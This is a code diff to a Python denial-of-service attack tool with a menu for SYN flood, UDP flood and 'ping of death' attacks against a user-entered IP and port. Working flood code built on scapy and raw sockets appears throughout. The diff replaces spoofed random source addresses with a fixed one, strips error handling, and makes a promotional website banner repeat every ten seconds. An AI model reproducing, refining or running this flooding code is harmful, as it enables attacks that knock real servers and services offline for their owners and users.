@@ -51,10 +51,10 @@ def print_hacker_banner():
     time.sleep(1)
 
 def display_website():
-    """Display website info once"""
-    if not hasattr(display_website, 'printed'):
+    """Continuously display website info while the script is running"""
+    while True:
         print(f"{CYAN}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{RESET}")
-        display_website.printed = True
+        time.sleep(10)
 
 def check_root():
     """Check if the script is running as root"""
@@ -67,7 +67,7 @@ def server_status(target_ip):
     try:
         socket.create_connection((target_ip, 80), timeout=2)
         print(f"{GREEN}[+] Server {target_ip} is UP!{RESET}")
-    except socket.error:
+    except:
         print(f"{RED}[-] Server {target_ip} is DOWN!{RESET}")
 
 def syn_flood(target_ip, target_port, duration):
@@ -75,9 +75,13 @@ def syn_flood(target_ip, target_port, duration):
     print(f"{YELLOW}[+] Starting SYN Flood Attack on {target_ip}:{target_port}{RESET}")
     timeout = time.time() + duration
     packet_count = 0
+
+    # Use a valid source IP (could be a random one from a valid range or fixed for testing)
+    source_ip = "192.168.1.100"  # This is an example of a local IP, replace if necessary.
+
     while time.time() < timeout:
         try:
-            ip = IP(src=".".join(map(str, (random.randint(1, 255) for _ in range(4)))), dst=target_ip)
+            ip = IP(src=source_ip, dst=target_ip)  # Using a fixed or valid source IP
             tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
             packet = ip / tcp
             send(packet, verbose=False)
@@ -91,22 +95,14 @@ def syn_flood(target_ip, target_port, duration):
 def udp_flood(target_ip, target_port, duration):
     """UDP Packet Flood Attack"""
     print(f"{YELLOW}[+] Starting UDP Flood Attack on {target_ip}:{target_port}{RESET}")
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        packet = random._urandom(1024)
-    except socket.error as e:
-        print(f"{RED}[ERROR] Error creating UDP socket: {str(e)}{RESET}")
-        return
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    packet = random._urandom(1024)
     timeout = time.time() + duration
     packet_count = 0
     while time.time() < timeout:
-        try:
-            sock.sendto(packet, (target_ip, target_port))
-            packet_count += 1
-            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
-        except socket.error as e:
-            print(f"{RED}[ERROR] Error sending UDP packets: {str(e)}{RESET}")
-            break
+        sock.sendto(packet, (target_ip, target_port))
+        packet_count += 1
+        print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
     print(f"\n{GREEN}[+] UDP Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
 def ping_of_death(target_ip, duration):
@@ -115,22 +111,15 @@ def ping_of_death(target_ip, duration):
     timeout = time.time() + duration
     packet_count = 0
     while time.time() < timeout:
-        try:
-            packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
-            send(packet, verbose=False)
-            packet_count += 1
-            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
-        except Exception as e:
-            print(f"{RED}[ERROR] Issue with sending Ping of Death packets: {str(e)}{RESET}")
-            break
+        packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
+        send(packet, verbose=False)
+        packet_count += 1
+        print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
     print(f"\n{GREEN}[+] Ping of Death Attack Completed. Packets Sent: {packet_count}{RESET}")
 
 def main():
     print_hacker_banner()
     check_root()
-    
-    website_thread = threading.Thread(target=display_website, daemon=True)
-    website_thread.start()
 
     while True:
         print(f"{BOLD}{YELLOW}\nSelect Attack Type:{RESET}")
@@ -143,20 +132,10 @@ def main():
         if choice == "4":
             print(f"{GREEN}Exiting...{RESET}")
             sys.exit(0)
-
+        
         target_ip = input(f"{CYAN}Enter Target IP: {RESET}")
-        target_port = None
-        if choice in ["1", "2"]:
-            try:
-                target_port = int(input(f"{CYAN}Enter Target Port: {RESET}"))
-            except ValueError:
-                print(f"{RED}[ERROR] Invalid port number. Exiting...{RESET}")
-                sys.exit(1)
-        try:
-            duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}"))
-        except ValueError:
-            print(f"{RED}[ERROR] Invalid duration. Exiting...{RESET}")
-            sys.exit(1)
+        target_port = int(input(f"{CYAN}Enter Target Port: {RESET}")) if choice in ["1", "2"] else None
+        duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}"))
 
         server_status(target_ip)
 
@@ -171,4 +150,6 @@ def main():
 
 if __name__ == "__main__":
     print_warning()
+    website_thread = threading.Thread(target=display_website, daemon=True)
+    website_thread.start()
     main()
